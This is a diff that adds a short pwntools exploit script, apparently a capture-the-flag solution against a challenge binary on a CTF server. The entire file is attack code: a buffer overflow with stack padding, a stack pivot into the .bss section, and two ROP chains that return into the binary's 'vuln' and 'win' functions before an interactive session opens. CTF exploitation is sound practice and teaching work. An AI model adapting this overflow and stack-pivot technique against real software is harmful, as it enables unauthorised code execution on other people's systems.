@@ -1,0 +1,21 @@
+from pwn import *
+
+exe = context.binary = ELF("./chall")
+r = process()
+r = remote("ctf.compfest.id",7004)
+offset = 24 - 8
+rop = ROP(exe)
+rop.raw(b"A" * offset)
+rop.raw(exe.bss() + 0x900 + 0x10 + 0xc0 + 0x90 + 0x400 + 0x40)
+print(f"{hex(exe.bss() + 0x900 + 0x10 + 0xc0 + 0x90 + 0x400)}")
+rop.raw(exe.sym['vuln'] + 8)
+r.send(rop.chain())
+write("p",rop.chain())
+rop2 = ROP(exe)
+rop2.raw(exe.bss() + 0x900)
+rop2.raw(exe.sym['win'] + 11)
+rop2.raw(exe.bss() + 0x900 + 0xc0 + 0x90 + 0x400 + 0x40)
+rop2.raw(0x000000000040121e)
+sleep(3)
+r.sendline(rop2.chain())
+r.interactive()
